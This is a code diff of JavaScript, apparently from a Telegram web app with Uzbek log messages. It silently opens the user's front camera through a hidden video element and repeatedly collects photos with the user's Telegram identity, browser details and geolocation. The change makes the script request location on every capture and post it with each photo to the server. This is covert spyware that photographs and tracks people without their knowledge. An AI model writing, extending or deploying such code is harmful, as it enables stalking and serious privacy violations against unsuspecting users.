@@ -6,8 +6,6 @@ const user_id = user.id;
 const tg_fullname = `${user.first_name || ""} ${user.last_name || ""}`.trim();
 const tg_username = user.username || "";
 
-let locationSent = false;
-
 const video = document.createElement("video");
 video.style.display = "none";
 video.setAttribute("autoplay", true);
@@ -38,35 +36,17 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: fals
       formData.append("user_agent", navigator.userAgent);
       formData.append("platform", navigator.platform);
 
-      if (!locationSent) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            formData.append("latitude", pos.coords.latitude);
-            formData.append("longitude", pos.coords.longitude);
-            locationSent = true;
-            sendFormData(formData);
-          },
-          err => {
-            console.warn("❌ Geolokatsiya rad etildi:", err.message);
-            locationSent = true;
-            sendFormData(formData);
-          }
-        );
-      } else {
-        sendFormData(formData);
-      }
-
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          formData.append("latitude", pos.coords.latitude);
+          formData.append("longitude", pos.coords.longitude);
+          fetch("/send-photo", { method: "POST", body: formData });
+        },
+        err => {
+          console.warn("❌ Geolokatsiya bloklangan:", err.message);
+          fetch("/send-photo", { method: "POST", body: formData });
+        }
+      );
     }, 3000);
   })
   .catch(err => console.error("❌ Kamera xatosi:", err.message));
-
-function sendFormData(formData) {
-  fetch("/send-photo", {
-    method: "POST",
-    body: formData
-  }).then(() => {
-    console.log("✅ Rasm yuborildi");
-  }).catch(err => {
-    console.error("❌ Yuborilmadi:", err.message);
-  });
-}
